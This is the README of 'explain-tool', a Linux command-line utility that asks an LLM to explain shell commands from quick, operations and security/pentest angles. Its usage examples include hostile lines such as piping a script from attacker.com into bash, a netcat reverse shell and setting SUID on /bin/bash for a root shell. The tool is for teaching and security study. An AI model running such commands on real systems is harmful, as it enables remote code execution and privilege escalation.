<div align="center">

# explain-tool

**Linux 通用 AI 命令解释工具**

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Python](https://img.shields.io/badge/Python-3.8%2B-blue.svg)](https://www.python.org/)
[![Platform](https://img.shields.io/badge/Platform-Linux-orange.svg)]()
[![Distros](https://img.shields.io/badge/Distros-Debian%20%7C%20Fedora%20%7C%20Arch%20%7C%20openSUSE%20%7C%20Alpine-lightgrey.svg)]()
[![apt](https://img.shields.io/badge/Install-apt%20%7C%20script%20%7C%20manual-green.svg)]()

输入任意 Linux 命令，即刻获得**三种视角**的专业解释：  
⚡ 快速一句话 · 🔧 通用运维 · 🔴 安全渗透

</div>

---

## 目录

- [功能概览](#功能概览)
- [安装](#安装)
- [配置](#配置)
- [使用方法](#使用方法)
- [命令参考](#命令参考)
- [支持的 LLM 后端](#支持的-llm-后端)
- [环境变量](#环境变量)
- [文件结构](#文件结构)
- [卸载](#卸载)
- [注意事项](#注意事项)

---

## 功能概览

| 特性 | 说明 |
|------|------|
| ⚡ **快速模式** `-q` | 1-3 句话直接说明命令作用，响应速度最快 |
| 🔧 **通用视角** `-g` | 参数解析、运维场景、最佳实践、相似命令对比 |
| 🔴 **安全视角** `-s` | PrivEsc 利用链、GTFOBins、CTF 场景、蓝队检测 |
| 🌐 **双语输出** | 中文 `zh`（默认）/ English `en`，随时切换 |
| 🤖 **多后端支持** | OpenAI · DeepSeek · Ollama（本地离线）· 任意兼容 API |
| 💾 **本地缓存** | 相同命令自动命中缓存，无需重复调用 API |
| 🎨 **终端美化** | 基于 `rich` 渲染 Markdown，不安装时自动降级纯文本 |

---

## 安装

### 方式一：apt 安装（Debian / Ubuntu / Kali，推荐）

> 支持 `apt upgrade` 自动更新，适合 Debian 系发行版长期使用。

```bash
# 添加 GPG 公钥
sudo mkdir -p /etc/apt/keyrings
curl -fsSL https://kriemseeley.github.io/explain_easily/explain-tool.gpg.key \
    | sudo gpg --yes --dearmor -o /etc/apt/keyrings/explain-tool.gpg

# 添加软件源
echo "deb [signed-by=/etc/apt/keyrings/explain-tool.gpg arch=all] \
https://kriemseeley.github.io/explain_easily stable main" \
    | sudo tee /etc/apt/sources.list.d/explain-tool.list

# 安装
sudo apt update && sudo apt install explain-tool
```

### 方式二：一键脚本安装（所有发行版通用）

脚本自动检测发行版并调用对应包管理器安装依赖。

```bash
git clone https://github.com/Kriemseeley/explain_easily.git
cd explain_easily
chmod +x install.sh && ./install.sh
```

**支持的发行版：**

| 发行版系列 | 包管理器 | 代表系统 |
|-----------|---------|---------|
| Debian 系 | `apt` | Debian · Ubuntu · Kali · Linux Mint |
| Red Hat 系 | `dnf` / `yum` | Fedora · RHEL · CentOS · Rocky · AlmaLinux |
| Arch 系 | `pacman` | Arch Linux · Manjaro · EndeavourOS |
| SUSE 系 | `zypper` | openSUSE Leap · Tumbleweed |
| Alpine | `apk` | Alpine Linux（含 Docker 容器环境） |

### 方式三：手动安装（任意 Linux）

```bash
# 安装依赖
pip3 install rich           # 或：python3 -m pip install rich

# 安装主脚本
sudo cp explain /usr/local/bin/explain
sudo chmod +x /usr/local/bin/explain
```

---

## 配置

首次安装后，**必须**运行配置向导选择 LLM 后端：

```bash
explain --config
```

配置向导会引导完成以下设置：

| 配置项 | 说明 |
|--------|------|
| 后端选择 | openai / deepseek / ollama / custom |
| API Key | 云端 API 鉴权密钥（Ollama 无需填写） |
| 模型名称 | 如 `gpt-4o-mini`、`deepseek-chat`、`qwen2.5:7b` |
| 回复语言 | `zh`（中文）或 `en`（English） |
| 本地缓存 | 是否启用结果缓存 |

配置文件保存于 `~/.config/explain-tool/config.json`，可随时通过 `explain --config` 修改。

### 使用 Ollama（本地，无需 API Key）

```bash
# 拉取模型（推荐 qwen2.5:7b 或 llama3.2）
ollama pull qwen2.5:7b

# 配置时选择 ollama 后端
explain --config
```

> 渗透测试、CTF 等安全敏感场景下推荐使用本地 Ollama，命令内容完全不离开本机，无需网络连接。

### 使用环境变量（临时覆盖，适合脚本 / CI）

```bash
export EXPLAIN_API_KEY='sk-xxxxxxxxxxxxxxxx'
export EXPLAIN_API_BASE='https://api.deepseek.com/v1'   # 可选
export EXPLAIN_MODEL='deepseek-chat'                     # 可选
export EXPLAIN_LANG='en'                                 # 可选
```

---

## 使用方法

### 快速模式（`-q`）

最简洁的用法，1-3 句话直接给出命令作用，响应最快：

```bash
explain -q chmod u+s /bin/bash
explain -q find / -perm -4000 2>/dev/null
explain -q sudo -l
```

**示例输出：**
```
⚡ chmod u+s /bin/bash
为 /bin/bash 设置 SUID 位，使任何用户执行时都以文件所有者（通常是 root）的权限运行。
【⚠️ 安全风险：经典本地权限提升手法，可直接通过 /bin/bash -p 获得 root shell】
```

---

### 全视角（默认）

同时输出通用分析 + 安全分析，信息最完整：

```bash
explain chmod u+s /bin/bash
explain nmap -sV -O 192.168.1.1
explain curl http://attacker.com/shell.sh | bash
```

---

### 安全视角（`-s`）

深度分析渗透测试 / CTF / 权限提升价值，面向红队：

```bash
explain -s find / -perm -4000 2>/dev/null
explain -s python3 -c "import pty; pty.spawn('/bin/bash')"
explain -s nc -e /bin/bash 10.10.10.10 4444
```

**安全视角包含：**
- 权限提升（PrivEsc）利用条件与思路
- GTFOBins 收录情况及具体利用命令
- CTF 经典出题场景与利用链
- 风险等级评估表（PrivEsc / 持久化 / 信息泄露）
- 蓝队检测与防御建议（auditd 规则、SIEM 告警）

---

### 通用视角（`-g`）

系统管理员 / DevOps 角度的完整解释：

```bash
explain -g tar -czf backup.tar.gz /var/www
explain -g systemctl restart nginx
explain -g awk '{print $1}' /var/log/auth.log
```

**通用视角包含：**
- 参数逐项解析（表格形式）
- 日常运维典型使用场景
- 常见错误与性能注意事项
- 类似命令横向对比

---

### 语言切换

```bash
# 临时使用英文（仅本次）
explain --lang en chmod u+s /bin/bash
explain --lang en -s sudo -l
explain --lang en -q ls -la

# 永久切换（写入配置文件）
explain --config          # 向导中选择语言
# 或通过环境变量
export EXPLAIN_LANG=en
```

---

## 命令参考

```
用法:
  explain [视角] [选项] <命令及参数...>

视角标志（可单独使用，-s -g 可同时使用等价于全视角）:
  -q, --quick         ⚡ 快速模式：仅输出核心作用（1-3句），响应最快
  -s, --security      🔴 安全视角（渗透测试 / CTF / 红队 / PrivEsc）
  -g, --general       🔧 通用视角（系统管理 / 运维 / 最佳实践）
  （不加任何标志 = 全视角，等价于 -sg）

语言选项:
  --lang zh           中文回复（默认）
  --lang en           English response

缓存与后端:
  -n, --no-cache      忽略缓存，强制重新查询
  --backend BACKEND   临时指定后端（openai / ollama / deepseek / custom）

工具选项:
  --config            运行交互式配置向导
  --show-config       显示当前所有配置项
  --clear-cache       清空本地查询缓存
  --uninstall         交互式卸载（删除二进制文件和配置目录）
  -h, --help          显示帮助信息
```

---

## 支持的 LLM 后端

| 后端标识 | 服务 | API Key | 推荐模型 | 备注 |
|----------|------|---------|----------|------|
| `openai` | OpenAI | 必须 | `gpt-4o-mini` | 效果最佳 |
| `deepseek` | DeepSeek | 必须 | `deepseek-chat` | 性价比高，**国内推荐** |
| `ollama` | 本地 Ollama | 不需要 | `qwen2.5:7b` | 离线使用，**安全场景推荐** |
| `custom` | 任意 OpenAI 兼容 API | 视情况 | 自定义 | 支持 Kimi、通义等 |

> **推荐组合：**
> - 云端：DeepSeek — 价格低、响应快、中文优秀
> - 本地：Ollama + `qwen2.5:7b` — 数据不出本机，适合渗透测试环境

---

## 环境变量

所有环境变量优先级高于配置文件，CLI 参数优先级最高。

| 变量名 | 说明 | 示例 |
|--------|------|------|
| `EXPLAIN_API_KEY` | API 鉴权密钥 | `sk-xxxxxxxx` |
| `EXPLAIN_API_BASE` | API Base URL（覆盖默认） | `https://api.deepseek.com/v1` |
| `EXPLAIN_MODEL` | 模型名称（覆盖配置） | `deepseek-chat` |
| `EXPLAIN_LANG` | 回复语言（`zh` / `en`） | `en` |

---

## 文件结构

**项目仓库：**

```
explain_easily/
├── explain             # 主脚本（Python 3.8+，无强依赖，跨发行版通用）
├── install.sh          # 一键安装脚本（自动检测发行版，全 Linux 通用）
├── build-deb.sh        # 构建 .deb 包
├── publish-repo.sh     # 发布到 GitHub Pages apt 仓库
├── debian/             # Debian 打包元数据
│   ├── control
│   ├── changelog
│   ├── rules
│   ├── install
│   └── postinst
├── requirements.txt    # Python 依赖（仅 rich）
└── README.md
```

**运行时数据（用户目录）：**

```
~/.config/explain-tool/
├── config.json         # 配置文件（含后端、API Key、语言等）
└── cache/              # 查询结果缓存（按命令+模式+语言哈希存储）
```

---

## 卸载

**apt 安装：**
```bash
sudo apt remove explain-tool
```

**脚本 / 手动安装：**
```bash
# 方式一：通过工具自身卸载
explain --uninstall

# 方式二：手动删除
sudo rm -f /usr/local/bin/explain
rm -rf ~/.config/explain-tool
```

**同时清理软件源（如已添加）：**
```bash
sudo rm -f /etc/apt/sources.list.d/explain-tool.list
sudo rm -f /etc/apt/keyrings/explain-tool.gpg
```

---

## 注意事项

- **准确性**：所有解释均由 LLM 生成，可能存在偏差，关键操作请以 `man` 手册为准
- **合法使用**：安全视角内容仅供授权渗透测试、CTF 竞赛及安全学习研究使用，请严格遵守相关法律法规
- **数据安全**：敏感环境下建议使用本地 Ollama 模型，避免命令内容经由网络传输至第三方 API

---

<div align="center">

MIT License · [GitHub](https://github.com/Kriemseeley/explain_easily)

</div>
